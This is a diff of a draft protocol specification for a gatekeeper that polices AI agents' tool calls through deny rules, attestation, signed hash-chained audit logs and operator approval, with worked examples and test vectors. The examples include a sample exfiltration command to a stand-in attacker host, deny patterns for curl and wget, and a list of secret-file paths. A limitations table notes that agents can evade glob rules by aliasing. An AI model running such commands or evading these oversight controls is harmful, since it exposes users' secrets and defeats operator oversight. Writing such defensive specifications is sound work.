@@ -1,6 +1,6 @@
 # Atlas Protocol Specification
 
-**Version:** 0.8.1-draft
+**Version:** 0.8.4-draft
 **Status:** Working Draft
 **Authors:** TJ Lane (Corpus Sanctum)
 **Last updated:** 2026-03-29
@@ -64,11 +64,48 @@ Hard-deny rules (step 2) MUST NOT be bypassed by quiet mode, break-glass, or any
 
 ### 3.3 Policy engine semantics
 
-- Rules MUST be evaluated in order. First match wins.
-- Each rule has a `tool_pattern` (glob-like), an `action` (deny | ask | allow), and an OPTIONAL `reason`.
-- Pattern matching MUST be case-insensitive.
+- Rules MUST be evaluated in order. First match wins. Evaluation MUST stop at the first matching rule.
+- Each rule has a `tool_pattern`, an `action` (deny | ask | allow), an OPTIONAL `reason`, and an OPTIONAL `mitre_id`.
 - If no rule matches, the default verdict MUST be "ask".
 - Implementations SHOULD tag deny rules with MITRE ATT&CK technique IDs.
+
+### 3.3.1 Policy rule grammar
+
+A `tool_pattern` has one of two forms:
+
+**Tool-only match:**
+```
+<tool_glob>
+```
+Matches the tool name only. Example: `Bash`, `Read`, `Write*`.
+
+**Tool + input match:**
+```
+<tool_glob>(<input_glob>|<input_glob>|...)
+```
+Matches if the tool name matches `<tool_glob>` AND the input preview matches any `<input_glob>` alternative. Example: `Bash(*curl*|*wget*)`.
+
+**Wildcard syntax:**
+
+| Pattern | Meaning |
+|---|---|
+| `*` | Matches zero or more characters (equivalent to regex `.*`) |
+| All other characters | Literal match |
+
+- Regular expressions are NOT permitted in `tool_pattern`. Only `*` wildcards.
+- The special characters `. + ^ $ { } ( ) | [ ] \` are treated as literals (escaped before regex conversion).
+- The `*` character is the ONLY wildcard. `?`, `[a-z]`, `{a,b}` are literals.
+
+**Matching rules:**
+
+| Property | Requirement |
+|---|---|
+| **Case sensitivity** | Pattern matching MUST be case-insensitive for both tool name and input preview. |
+| **Tool vs input** | Tool name and input preview are matched independently — the tool glob matches against `tool_name`, input globs match against `input_preview`. |
+| **Alternatives** | Multiple input patterns inside parentheses are OR-separated by `\|`. Each alternative is trimmed of whitespace before matching. |
+| **Empty input** | If a tool+input pattern is used but the request has an empty `input_preview`, only the `*` glob matches. |
+| **Ordering guarantee** | Rules MUST be stored and evaluated in the order they appear in the configuration. Implementations MUST NOT reorder, deduplicate, or optimize rules. |
+| **Portability** | Implementations that claim conformance MUST produce the same match result for the reference test fixtures (`tests/policy-fixtures.test.ts`). |
 
 ### 3.4 Anomaly detection
 
@@ -151,20 +188,65 @@ For single-operator deployments (the gatekeeper is the only verifier), mechanism
 **Key rotation procedure:**
 
 1. Generate a new ML-DSA-65 keypair.
-2. Log a `KEY_ROTATION` audit entry (signed by the OLD key) containing the new public key hash.
+2. Log a `KEY_ROTATION` audit entry (signed by the OLD key) with the schema below.
 3. Re-issue all active credentials signed by the new key.
 4. Archive the old keypair (retain for verification of historical audit entries).
-5. The new `SESSION_START` entry pins the new key.
+5. The new `SESSION_START` entry pins the new key hash.
+
+**`KEY_ROTATION` audit entry schema:**
+
+The `KEY_ROTATION` event MUST be signed by the **old** key (proving the holder of the old key authorized the rotation). The `meta` object MUST contain:
+
+| Field | Type | Description |
+|---|---|---|
+| `old_key_hash` | string | SHA3-256 hash of the old public key |
+| `new_key_hash` | string | SHA3-256 hash of the new public key |
+| `new_public_key_b64` | string | Base64-encoded new public key (for verifiers) |
+| `effective_at` | string | ISO 8601 timestamp when the new key becomes active |
+| `reason` | string | Human-readable rotation reason (e.g., "scheduled rotation", "key compromise") |
+| `credentials_reissued` | number | Count of active credentials re-issued with the new key |
+| `reissue_success` | boolean | `true` if all active credentials were successfully re-issued |
+
+**Historical verification:**
+
+- Verifiers MUST retain old public keys to verify audit entries signed before the rotation.
+- Implementations SHOULD retain at least the 3 most recent public keys.
+- Entries before the `KEY_ROTATION` event are verified against the old key; entries after are verified against the new key. The `KEY_ROTATION` entry itself is verified against the old key.
+- If a verifier encounters an entry whose `pq_signature` fails against both the current and retained old keys, it MUST report `PQ_SIGNATURE_INVALID`.
 
 > **Note:** The reference implementation does not yet implement automated key rotation or well-known URI publication. These are specified for forward compatibility.
 
 ### 4.6 Bootstrap guard
 
-When the identity registry is empty (first run), attestation MUST return an unverified pass to avoid a catch-22 (can't register without a credential, can't get a credential without registering).
+**"Registry empty" definition:** The registry is empty when `credentials.size === 0` — no credential has ever been registered in this gatekeeper instance. This is distinct from "all credentials expired" or "all credentials revoked" (neither of which reactivates bootstrap mode).
 
-For **Production** conformance, the first credential registration MUST require two-channel confirmation: a verification code displayed on the host console and confirmed via the operator relay. This prevents a compromised agent from registering a malicious admin credential during the bootstrap window.
+When the registry is empty, attestation MUST return an unverified pass (with `identityVerified: false`) to avoid a catch-22.
 
-For **Development** conformance, two-channel confirmation MAY be skipped.
+**Bootstrap window constraints:**
+
+- Only the **first** credential registration is allowed without attestation. Once any credential exists (even if later revoked/expired), the bootstrap window closes permanently.
+- The first credential SHOULD have the `admin` role or include the `identity:register` capability. Implementations MAY enforce this as a MUST.
+- Implementations MUST NOT allow more than one unattested registration. If a second registration is attempted before the first completes, it MUST be rejected.
+
+**Two-channel confirmation (Production + Research):**
+
+For **Production** and **Research** conformance, the first credential registration MUST require two-channel confirmation:
+
+1. The gatekeeper generates a cryptographically random confirmation code (minimum 6 hex characters, sourced from a CSPRNG).
+2. The code is displayed on the host console (requires physical or SSH access).
+3. The code is sent as a challenge to the operator relay.
+4. The operator MUST reply with the exact code via the relay within the confirmation timeout.
+5. If the code matches, registration proceeds. Otherwise, registration is denied.
+
+| Property | Requirement |
+|---|---|
+| **Code entropy** | Minimum 24 bits (6 hex characters). MUST use `crypto.randomBytes` or equivalent CSPRNG. |
+| **Timeout** | Default 120 seconds. Configurable. MUST NOT exceed 300 seconds. |
+| **Replay protection** | Each code MUST be single-use. A used code MUST NOT be accepted again. |
+| **Maximum attempts** | After 3 failed confirmation attempts, the gatekeeper MUST lock bootstrap for 10 minutes. |
+| **Case sensitivity** | Code comparison MUST be case-insensitive. |
+
+For **Development** conformance, two-channel confirmation MAY be skipped (via `ATLAS_BOOTSTRAP_SKIP_CONFIRM=true`). When skipped, a `BOOTSTRAP_CONFIRM_SKIPPED` event MUST be logged.
 
 ## 5. Credential delegation
 
@@ -230,7 +312,7 @@ The audit log MUST be append-only JSONL (one JSON object per line).
 Implementations MUST provide at minimum:
 
 1. **Hash chaining** — each entry MUST include `prev_hash`, the SHA3-256 hash of the previous line. The first entry uses `"GENESIS"`.
-2. **Sequence numbers** — each entry MUST include `seq`, a monotonic 0-indexed integer. The verifier MUST detect gaps.
+2. **Sequence numbers** — each entry MUST include `seq`, a **global monotonic** 0-indexed integer. See §6.2.1 for exact semantics.
 
 Implementations SHOULD provide:
 
@@ -240,6 +322,28 @@ Implementations MAY provide:
 
 4. **HMAC-SHA256 signatures** — classical `hmac` field for backwards compatibility.
 5. **External anchoring** — publishing checkpoint hashes to a transparency log or blockchain.
+
+### 6.2.1 Sequence number semantics
+
+The `seq` field is a **global monotonic counter** that spans the entire audit trail lifetime, including across file rotations. It MUST NOT reset on rotation.
+
+| Property | Requirement |
+|---|---|
+| **Starting value** | `seq` MUST start at `0` for the first entry ever written by this gatekeeper instance. |
+| **Increment** | Each subsequent entry MUST have `seq` equal to the previous entry's `seq + 1`. No gaps. No duplicates. |
+| **Scope** | Global across all files. After rotation, the new file's first entry MUST continue the sequence from the prior file's last `seq + 1`. |
+| **Concurrency** | A single gatekeeper process MUST be the sole writer. If two writers race, the audit log is considered corrupt. Implementations MUST NOT support concurrent writers. |
+| **Gap semantics** | A verifier that encounters `seq` values `[0, 1, 2, 5, 6]` MUST report entries 3 and 4 as missing (potential truncation). |
+| **Rotation bridge** | The rotation manifest (§6.5) MUST record `final_seq` (last `seq` in the rotated file) and `next_seq` (expected first `seq` of the new file, equal to `final_seq + 1`). |
+
+**Verifier failure modes:**
+
+| Condition | Verifier behavior |
+|---|---|
+| Gap in `seq` | MUST report error: "sequence gap at seq N — entries may be truncated" |
+| Duplicate `seq` | MUST report error: "duplicate seq N — log may be corrupted" |
+| `seq` not starting at expected value (after rotation) | MUST report error unless manifest confirms the expected starting `seq` |
+| Missing `seq` field on an entry | MUST treat as a legacy entry (pre-v0.8.1) and skip sequence validation for that entry only |
 
 ### 6.3 Periodic checkpoints
 
@@ -276,13 +380,42 @@ Implementations SHOULD additionally consider:
 
 When the audit log exceeds a configurable size threshold, implementations SHOULD rotate the file to an archive directory. The rotation manifest MUST record:
 
-- Rotated filename
-- Entry count
-- File size
-- SHA3-256 hash of the last line (chain anchor)
-- SHA3-256 hash of the entire file (integrity check)
+| Field | Description |
+|---|---|
+| `rotated_name` | Filename of the archived file |
+| `entry_count` | Number of entries in the rotated file |
+| `size_bytes` | File size in bytes |
+| `final_hash` | SHA3-256 hash of the last line (chain anchor) |
+| `file_hash` | SHA3-256 hash of the entire file content |
+| `final_seq` | `seq` value of the last entry in the rotated file |
+| `next_seq` | Expected `seq` of the new file's first entry (`final_seq + 1`) |
+| `rotated_at` | ISO 8601 timestamp of rotation |
 
-The chain anchor from the rotated file becomes the effective `prev_hash` for the new file's first entry.
+**First entry after rotation:**
+
+The new file's first entry MUST have:
+- `prev_hash` equal to the SHA3-256 hash of the rotated file's last line (the `final_hash` from the manifest).
+- `seq` equal to `next_seq` from the manifest.
+
+Implementations SHOULD emit a `SESSION_START` or `CHECKPOINT` entry as the first entry of the new file to anchor the chain.
+
+**Cross-archive verification:**
+
+A verifier spanning multiple archived files MUST:
+1. Verify each archive independently (hash chain + sequence continuity within the file).
+2. Verify the manifest's `final_hash` matches the SHA3-256 of the archive's last line.
+3. Verify the manifest's `file_hash` matches the SHA3-256 of the entire archive content.
+4. Verify `next_seq` of archive N equals the first `seq` of archive N+1.
+5. Verify the `final_hash` of archive N equals the `prev_hash` of the first entry in archive N+1.
+
+**Manifest failure modes:**
+
+| Condition | Verifier behavior |
+|---|---|
+| Manifest missing | MUST report warning. MAY attempt to reconstruct chain continuity from file contents alone. |
+| Manifest `file_hash` mismatch | MUST report error: archive file tampered. |
+| Manifest `final_seq`/`next_seq` mismatch | MUST report error: possible truncation between archives. |
+| Archive file missing | MUST report error: archive N missing. |
 
 ### 6.6 Entry schema
 
@@ -349,7 +482,17 @@ This prevents the CoE from being an unattributed hallucination layer. Consumers 
 
 Each signal in the `ExpertAssessment.signals` array MUST reference at least one specific audit entry by its `id` field (e.g., `"T1059 match on entry abc12345"`). This grounds the CoE output in observable evidence rather than model confabulation.
 
-Implementations MUST surface a flag when signals cannot be grounded to specific entries:
+**Grounding definition:** A signal is "grounded" if it contains a substring that matches the `id` field (UUID) of at least one audit entry in the analyzed window. An 8+ character prefix match is sufficient (UUIDs are 36 chars; 8 hex chars = 32 bits of uniqueness).
+
+**Minimum evidence requirements:**
+
+| Expert | Minimum grounded signals |
+|---|---|
+| Anomaly detector | At least 1 grounded signal per finding, or `ungroundedSignals: true` |
+| Intent inferencer | At least 2 grounded signals (intent requires a sequence) |
+| Threat narrator | At least 1 grounded signal per cited MITRE technique |
+
+Implementations MUST surface a flag when signals cannot be grounded:
 
 ```typescript
 interface ExpertAssessment {
@@ -359,7 +502,13 @@ interface ExpertAssessment {
 }
 ```
 
-Consumers of `WhyAssessment` artifacts MUST treat findings with `ungroundedSignals: true` as lower-confidence than grounded findings. Research artifacts that contain ungrounded signals MUST NOT be presented as primary evidence without explicit disclosure.
+**Confidence downgrade:** When `ungroundedSignals` is `true`, consumers MUST:
+
+- Treat the assessment's `confidence` as no higher than `"low"`, regardless of the model's self-reported confidence.
+- Display a visible indicator (e.g., "(ungrounded)") in any UI that surfaces the finding.
+- Exclude ungrounded findings from automated escalation decisions.
+
+Research artifacts that contain ungrounded signals MUST NOT be presented as primary evidence without explicit disclosure.
 
 ### 7.5 Research artifact integrity
 
@@ -435,28 +584,94 @@ Provides emergency override when the operator relay transport is unreachable.
 
 Reduces operator noise for mature agents performing low-risk actions.
 
-### 10.2 Eligibility
+### 10.2 Invariants
+
+These invariants MUST hold regardless of configuration:
+
+1. Quiet mode MUST only act on "ask" verdicts. It MUST NEVER bypass a "deny" verdict.
+2. Quiet mode does NOT create an alternate policy engine — it is a post-policy filter on "ask" results.
+3. Sensitivity matching (§3.4, consent boundaries) MUST be evaluated BEFORE quiet eligibility. Any sensitivity match disqualifies.
+4. Any anomaly flag (even one) MUST disqualify the request from quiet approval.
+5. Any identity uncertainty (`identityVerified: false`) MUST disqualify.
+6. Quiet mode MUST be off by default. Explicit opt-in required.
+
+### 10.3 Eligibility
 
 A request is eligible for quiet-mode auto-approval only if ALL of the following are true:
 
 - Quiet mode is enabled (off by default).
-- The policy verdict is "ask" (never bypasses deny).
-- The agent's identity is verified.
-- The agent's baseline maturity meets the configured threshold (default: mature).
-- The tool is in the quiet-eligible set (default: read-only tools).
-- The request has zero anomaly flags.
-- The request has zero sensitivity matches.
-- The input does not match any sensitive path pattern.
+- The policy verdict is "ask" (invariant 1).
+- The agent's identity is verified (invariant 5).
+- The agent's baseline maturity meets the configured threshold (default: mature / 200+ sessions).
+- The tool is in the quiet-eligible set (default: read-only tools — `Read`, `Glob`, `Grep`).
+- The request has zero anomaly flags (invariant 4).
+- The request has zero sensitivity matches (invariant 3).
+- The input does not match any sensitive path pattern (§10.4).
 
-### 10.3 Sensitive path patterns
+**Evaluation order:** The eligibility checks MUST be evaluated in the order listed. Implementations MUST short-circuit on the first failing check (for efficiency and auditability).
+
+### 10.4 Sensitive path patterns
 
 At minimum, implementations MUST block quiet-mode approval for paths matching:
 
 `.env`, `.ssh`, `.gnupg`, `/etc/`, `credentials`, `secret`, `token`, `api_key`, `password`, `shadow`, `.pem`, `.key`, `.p12`, `.pfx`.
 
-## 11. Extensions
+Implementations MAY add additional patterns but MUST NOT remove any from this minimum set.
 
-### 11.1 DIB Briefcase integration (OPTIONAL)
+## 11. Forward compatibility
+
+### 11.1 Unknown field handling
+
+**Signed canonical payloads** (credential, delegation authority, audit entries for signing): unknown fields MUST be excluded before hashing or signing, per Appendix D.4. This is the strictest rule — it prevents unsigned structural mutations from being smuggled into signed objects.
+
+**Runtime objects** (credentials in registry, audit entries in logs, baseline profiles): implementations MUST ignore unknown fields when reading, and MUST preserve them when reserializing. This allows newer writers to add fields without breaking older readers.
+
+**Extension fields**: implementations that need custom fields SHOULD place them under an `extensions` object:
+
+```json
+{
+  "agentId": "did:atlas:...",
+  "extensions": {
+    "x-myorg-clearance": "TS/SCI",
+    "x-myorg-project": "ATLAS-7"
+  }
+}
+```
+
+Fields under `extensions` MUST be ignored by implementations that do not recognize them, and MUST be preserved on reserialization. Fields under `extensions` MUST be excluded from canonical payloads (they are not signed).
+
+### 11.2 Version negotiation
+
+The protocol version appears in several locations:
+
+| Location | Field | Authoritative? |
+|---|---|---|
+| Credential `version` field | `"0.5.0"` (credential schema version) | For credential structure |
+| Delegation authority `version` | Protocol version at delegation time | For delegation structure |
+| `SESSION_START` audit entry | `meta.version` | For gatekeeper runtime |
+| `ModelProvenance.protocolVersion` | Protocol version at assessment time | For Why Layer output |
+
+**Version authority rules:**
+
+- The **gatekeeper's runtime version** (from `SESSION_START`) is the authoritative version for the current session's behavior.
+- The **credential version** indicates which credential schema was used. A gatekeeper MAY accept credentials from older schema versions if the fields are a subset.
+- A gatekeeper MUST NOT accept credentials from a **newer major version** than it implements (e.g., a v0.x gatekeeper MUST reject a v1.x credential).
+- Minor version differences (e.g., v0.8.1 vs v0.8.3) MUST be tolerated — newer minor versions add fields but do not remove or redefine existing ones.
+- A verifier that encounters an audit entry with an unrecognized `hash_algorithm` MUST report an error rather than silently skip verification.
+
+**Compatibility matrix:**
+
+| Scenario | Behavior |
+|---|---|
+| Credential version < gatekeeper version (same major) | MUST accept. Older credentials remain valid. |
+| Credential version > gatekeeper version (same major) | SHOULD accept if unknown fields are limited to `extensions`. MUST reject if structural fields are unrecognized. |
+| Credential major version ≠ gatekeeper major version | MUST reject. |
+| Audit entry with unknown `event` type | MUST preserve in log. Verifier MUST validate hash chain but MAY skip event-specific checks. |
+| Audit entry with unknown `hash_algorithm` | MUST report verification error. |
+
+## 12. Extensions
+
+### 12.1 DIB Briefcase integration (OPTIONAL)
 
 When a DIB Briefcase is loaded, the policy engine enforces consent boundaries from a 7-tier consent model (Public through Sealed / 42 CFR Part 2). This is an optional privacy hardening layer — Atlas works fully without it.
 
@@ -468,7 +683,7 @@ The Briefcase provides:
 
 Implementations MAY support other consent/privacy frameworks through the same extension point.
 
-### 11.2 Inference runtime (reference: Ollama)
+### 12.2 Inference runtime (reference: Ollama)
 
 The reference implementation uses Ollama for the Why Layer's Council of Experts. Implementations MAY use any inference runtime that supports:
 
@@ -476,7 +691,7 @@ The reference implementation uses Ollama for the Why Layer's Council of Experts.
 - Configurable model selection
 - Local-first deployment (recommended for privacy)
 
-### 11.3 Operator relay (reference: Telegram)
+### 12.3 Operator relay (reference: Telegram)
 
 The reference implementation uses the Telegram Bot API for operator relay. Implementations MAY use any transport that supports:
 
@@ -628,3 +843,458 @@ Conformant implementations SHOULD include test vectors that verify canonical ser
 3. An audit entry → expected `prev_hash` value for the next entry.
 
 > **Note:** The reference implementation's test suite includes these vectors. Third-party implementations SHOULD validate against them before claiming conformance.
+
+## Appendix E: Normative error codes
+
+All error codes are stable string enums. Implementations MUST use these exact values in audit entries, API responses, and machine-readable outputs. Tooling, dashboards, and research artifacts MAY rely on these values for programmatic consumption.
+
+### E.1 Attestation result codes
+
+Returned by the attestation layer (§3.2 step 1). A missing code means attestation succeeded.
+
+| Code | Meaning |
+|---|---|
+| `UNREGISTERED_AGENT` | No credential found for the provided agent ID |
+| `CREDENTIAL_EXPIRED` | Credential exists but its `expiresAt` is in the past |
+| `CREDENTIAL_REVOKED` | Credential has been revoked |
+| `CAPABILITY_MISMATCH` | Credential is valid but lacks the capability required by the requested tool |
+
+### E.2 Delegation failure codes
+
+Returned when a delegation request fails validation (§5.1).
+
+| Code | Meaning |
+|---|---|
+| `PARENT_NOT_FOUND` | Parent agent ID not in registry |
+| `PARENT_EXPIRED` | Parent credential has expired |
+| `PARENT_REVOKED` | Parent credential has been revoked |
+| `CAPABILITY_ESCALATION` | Requested child capabilities are not a subset of parent's |
+| `DEPTH_EXCEEDED` | Delegation would exceed maximum depth (3) |
+| `TTL_EXCEEDS_PARENT` | Requested child TTL would outlive parent's remaining lifetime |
+
+### E.3 Audit verification failure codes
+
+Returned by the audit log verifier (§6).
+
+| Code | Meaning |
+|---|---|
+| `CHAIN_BROKEN` | `prev_hash` does not match expected hash of previous entry |
+| `SEQUENCE_GAP` | `seq` values are not contiguous |
+| `SEQUENCE_DUPLICATE` | Same `seq` value appears more than once |
+| `HMAC_MISMATCH` | HMAC-SHA256 signature does not match entry content |
+| `PQ_SIGNATURE_INVALID` | ML-DSA-65 signature verification failed |
+| `INVALID_JSON` | Log line is not valid JSON |
+| `ARCHIVE_MISSING` | Referenced archive file not found |
+| `ARCHIVE_TAMPERED` | Archive file hash does not match manifest |
+| `MANIFEST_SEQ_MISMATCH` | `final_seq`/`next_seq` discontinuity between archives |
+
+### E.4 Break-glass failure codes
+
+Returned when break-glass operations fail.
+
+| Code | Meaning |
+|---|---|
+| `TOKEN_EXPIRED` | Break-glass token has expired |
+| `TOKEN_EXHAUSTED` | Token `max_requests` limit reached |
+| `TOKEN_CORRUPT` | Token file exists but cannot be parsed |
+| `CONFIRMATION_TIMEOUT` | Operator did not confirm activation within timeout |
+| `CONFIRMATION_MISMATCH` | Operator response did not match confirmation code |
+| `RELAY_SEND_FAILED` | Could not send confirmation prompt to relay transport |
+
+### E.5 Extensibility
+
+Implementations MAY define additional error codes prefixed with `X_` (e.g., `X_CUSTOM_CHECK_FAILED`). Standard codes MUST NOT be prefixed. Consumers that encounter an unrecognized code SHOULD treat it as a generic failure of the relevant category.
+
+## Appendix F: Canonical worked examples
+
+### F.1 Root credential
+
+```json
+{
+  "agentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+  "name": "primary-claude",
+  "role": "admin",
+  "issuedAt": "2026-03-29T14:00:00.000Z",
+  "expiresAt": "2026-03-30T14:00:00.000Z",
+  "publicKey": "a1b2c3d4...(ML-DSA-65 public key, hex-encoded, ~2592 bytes)...",
+  "capabilities": ["audit:read", "file:read", "file:write", "identity:register", "identity:revoke", "shell:exec"],
+  "version": "0.5.0",
+  "revoked": false,
+  "issuerSignature": "MEUC...(ML-DSA-65 signature, base64)...",
+  "credentialHash": "3b48e327...(SHA3-256 of canonical payload)..."
+}
+```
+
+The `credentialHash` is computed over the canonical payload (all fields except `issuerSignature` and `credentialHash`, keys sorted, capabilities sorted). The `issuerSignature` is ML-DSA-65 sign(issuerSecretKey, canonicalPayload).
+
+### F.2 Delegated credential
+
+```json
+{
+  "agentId": "did:atlas:6ba7b810-9dad-11d1-80b4-00c04fd430c8",
+  "name": "file-reader-child",
+  "role": "tool-caller",
+  "issuedAt": "2026-03-29T15:00:00.000Z",
+  "expiresAt": "2026-03-30T14:00:00.000Z",
+  "publicKey": "b2c3d4e5...",
+  "capabilities": ["file:read"],
+  "version": "0.5.0",
+  "revoked": false,
+  "delegated": true,
+  "delegation": {
+    "rootId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+    "parentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+    "depth": 1,
+    "chainSignature": "MEQC...(ML-DSA-65 signature over delegation authority object)..."
+  },
+  "issuerSignature": "MEUC...",
+  "credentialHash": "7d9f2a..."
+}
+```
+
+### F.3 Delegation authority payload (signed by parent)
+
+```json
+{
+  "protocol": "atlas-protocol",
+  "version": "0.5.0",
+  "type": "delegation-authority",
+  "rootId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+  "parentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+  "childId": "did:atlas:6ba7b810-9dad-11d1-80b4-00c04fd430c8",
+  "capabilities": ["file:read"],
+  "expiresAt": "2026-03-30T14:00:00.000Z",
+  "depth": 1,
+  "childCredentialHash": "7d9f2a..."
+}
+```
+
+The `chainSignature` in the delegated credential is ML-DSA-65 sign(parentSecretKey, JSON.stringify(above)).
+
+### F.4 Audit entry (POLICY_DENY)
+
+```json
+{
+  "id": "7f3a9b2e-1c4d-4e5f-8a6b-9c0d1e2f3a4b",
+  "timestamp": "2026-03-29T14:05:23.000Z",
+  "event": "POLICY_DENY",
+  "seq": 42,
+  "permission": {
+    "request_id": "abcde",
+    "tool_name": "Bash",
+    "description": "Execute shell command",
+    "input_preview": "curl https://evil.com/exfil"
+  },
+  "policy_result": {
+    "verdict": "deny",
+    "matched_rule": {
+      "tool_pattern": "Bash(*curl*)",
+      "action": "deny",
+      "reason": "Network exfiltration tool blocked",
+      "mitre_id": "T1048"
+    },
+    "anomaly_flags": ["DATA_EXFILTRATION: outbound data transfer detected"],
+    "sensitivity_matches": [],
+    "identity_evaluated": false
+  },
+  "verdict": "deny",
+  "rule_id": "Bash(*curl*)",
+  "mitre": { "id": "T1048", "name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration" },
+  "agentId": "did:atlas:550e8400-e29b-41d4-a716-446655440000",
+  "identityVerified": true,
+  "agentRole": "admin",
+  "hash_algorithm": "sha3-256",
+  "prev_hash": "a3f2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3",
+  "pq_signature": "MEUC...(ML-DSA-65 signature, base64)..."
+}
+```
+
+The next entry's `prev_hash` = SHA3-256 of this entire line (including `pq_signature`).
+
+### F.5 Checkpoint entry
+
+```json
+{
+  "id": "8a4b5c6d-7e8f-9a0b-1c2d-3e4f5a6b7c8d",
+  "timestamp": "2026-03-29T14:10:00.000Z",
+  "event": "CHECKPOINT",
+  "seq": 100,
+  "hash_algorithm": "sha3-256",
+  "prev_hash": "e35044e6...(SHA3-256 of seq=99 entry)...",
+  "meta": {
+    "checkpoint_seq": 100,
+    "checkpoint_hash": "e35044e6...",
+    "entries_since_start": 101
+  },
+  "pq_signature": "MEUC..."
+}
+```
+
+### F.6 Rotation manifest entry
+
+```json
+{
+  "rotated_name": "audit-20260329-140000.jsonl",
+  "entry_count": 500,
+  "size_bytes": 1048576,
+  "final_hash": "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4",
+  "file_hash": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
+  "final_seq": 499,
+  "next_seq": 500,
+  "rotated_at": "2026-03-29T14:00:00.000Z"
+}
+```
+
+The new file's first entry MUST have `prev_hash` = `final_hash` and `seq` = `next_seq` (500).
+
+### F.7 Redacted permission object
+
+```json
+{
+  "request_id": "abcde",
+  "tool_name": "Bash",
+  "description": "Execute shell command",
+  "input_preview": "REDACTED:e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08"
+}
+```
+
+The `input_preview` was replaced with `REDACTED:HMAC-SHA256(redaction_key, original_value)`. The same original value always produces the same HMAC, enabling frequency analysis without exposing plaintext.
+
+## Appendix G: Conformance test vectors
+
+These test vectors allow third-party implementations to verify canonical serialization and hashing without reading the reference source code. All hashes are computed per Appendix D rules.
+
+### G.1 Credential hash
+
+**Input (canonical form, keys sorted, capabilities sorted):**
+```
+{"agentId":"did:atlas:00000000-0000-4000-8000-000000000001","capabilities":["file:read","file:write","shell:exec"],"expiresAt":"2026-03-30T00:00:00.000Z","issuedAt":"2026-03-29T00:00:00.000Z","name":"test-agent","publicKey":"0000000000000000","revoked":false,"role":"claude-code","version":"0.5.0"}
+```
+
+**Expected SHA3-256:** `3b48e327089abd0ca4578d6cfb8a57a0568544dc3b82e199e77f9ab553e3e6e7`
+
+### G.2 Audit entry prev_hash
+
+**Input (serialized audit line, keys sorted):**
+```
+{"event":"SESSION_START","hash_algorithm":"sha3-256","id":"00000000-0000-4000-8000-000000000099","prev_hash":"GENESIS","seq":0,"timestamp":"2026-03-29T00:00:00.000Z"}
+```
+
+**Expected SHA3-256 (= next entry's `prev_hash`):** `e35044e60e1c8c051d9b383a93b32491db5d2a4c9a85b2a6480e76cfc075bb65`
+
+### G.3 Delegation authority hash
+
+**Input:**
+```
+{"protocol":"atlas-protocol","version":"0.5.0","type":"delegation-authority","rootId":"did:atlas:00000000-0000-4000-8000-000000000001","parentId":"did:atlas:00000000-0000-4000-8000-000000000001","childId":"did:atlas:00000000-0000-4000-8000-000000000002","capabilities":["file:read"],"expiresAt":"2026-03-30T00:00:00.000Z","depth":1,"childCredentialHash":"3b48e327089abd0ca4578d6cfb8a57a0568544dc3b82e199e77f9ab553e3e6e7"}
+```
+
+**Expected SHA3-256:** `4cde93186bcc1d1442ebf69c6ef44e3aec8b46c516649087318148baaa91538d`
+
+### G.4 Redacted field (keyed hash)
+
+**Redaction key:** `atlas-redaction-v1:test-secret-key`
+**Input value:** `000-00-0000`
+**Expected HMAC-SHA256:** `e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08`
+**Redacted output:** `REDACTED:e9c7beecbf583f42f83e39aa740f82d2bc9ee62ddaebc5462ce23048579a2b08`
+
+### G.5 Rotation bridge
+
+**Last line of old file:**
+```
+{"event":"POLICY_ALLOW","seq":499,"prev_hash":"abc123"}
+```
+**SHA3-256 (= `final_hash` in manifest):** `eea363770aec9554fd590017851868217d4c7b476d8a0bce92a35e78a7c811c0`
+**New file's first entry MUST have:** `prev_hash` = `eea363770aec...`, `seq` = `500`
+
+### G.6 Checkpoint verification
+
+A verifier checks a checkpoint by:
+1. Reading `meta.checkpoint_hash` from the checkpoint entry.
+2. Computing SHA3-256 of the serialized line at `seq = checkpoint_seq - 1`.
+3. Comparing. If mismatch → `CHAIN_BROKEN`.
+
+### G.7 Signature verification note
+
+ML-DSA-65 signature test vectors are not included here because they require specific keypair material. The reference implementation's test suite (`tests/agent-identity.test.ts`, `tests/audit-log.test.ts`) generates ephemeral keypairs and verifies signatures end-to-end. Third-party implementations SHOULD validate against the hash test vectors above and then run the signature test suite with their own ML-DSA-65 implementation.
+
+## Appendix H: Security limitations
+
+Atlas Protocol improves auditability and operator oversight for autonomous AI agents. It does NOT provide universal trust guarantees. This section enumerates what Atlas explicitly does not solve.
+
+| Threat | Atlas posture | Residual risk |
+|---|---|---|
+| **Host compromise** | Atlas cannot protect against a compromised host. If an attacker has root access, they can read signing keys, forge audit entries, and bypass all controls. | Mitigate with host hardening, HSM key storage (future), and external audit anchoring. |
+| **Malicious local operator** | Atlas trusts the operator. A malicious operator can approve any request, forge break-glass tokens, and suppress alerts. | Atlas is operator-oversight, not operator-proof. Separation of duties requires organizational controls. |
+| **Compromised inference runtime** | If the Ollama instance (or equivalent) is compromised, the Why Layer produces unreliable assessments. | The Why Layer is non-gating by design. It informs but does not decide. Compromised assessments affect narration quality, not permission decisions. |
+| **Bad rulesets** | The policy engine enforces rules as written. A misconfigured ruleset with missing deny patterns allows dangerous commands through. | Use `atlas_test_policy` regression testing after every rule change. The reference ruleset covers 96 rules across 13 attack categories. |
+| **LLM semantic misunderstanding** | The policy engine uses glob patterns, not semantic analysis. An agent can potentially circumvent string-matching rules via indirect tool invocations or aliasing. | Defense in depth: anomaly detection, behavioral baselines, and Why Layer intent inference supplement pattern matching. |
+| **Relay transport compromise** | If the Telegram bot token (or equivalent) is stolen, an attacker can approve requests and suppress denials. | Rotate bot tokens, restrict chat IDs, use two-channel confirmation for bootstrap and break-glass. |
+| **Low-entropy redaction** | Bare SHA-256 over low-entropy values (SSN, phone) is trivially reversible via brute force. | Atlas requires HMAC-SHA256 with a secret key for redaction (§6.7). Implementations MUST NOT use bare SHA-256 for low-entropy fields. |
